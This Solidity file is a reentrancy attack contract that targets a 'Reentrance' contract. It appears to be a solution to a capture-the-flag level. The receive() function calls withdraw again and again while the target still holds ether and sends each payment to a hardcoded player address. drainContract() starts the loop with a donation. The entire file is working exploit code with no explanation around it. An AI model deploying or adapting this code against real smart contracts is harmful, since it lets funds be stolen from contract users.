// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import "./Reentrance.sol";

contract Reentrant {

    Reentrance public reentrance = Reentrance(payable(0xD88Be324Af901CB73C91C2142323D04bE9ba3b15));
    address payable player = payable(0x76178270f00998Aa3a46D4489c121E9b1d8646bC);

    receive() external payable {
        player.transfer(msg.value);
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(msg.value);
        }
    }

    function drainContract() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }
}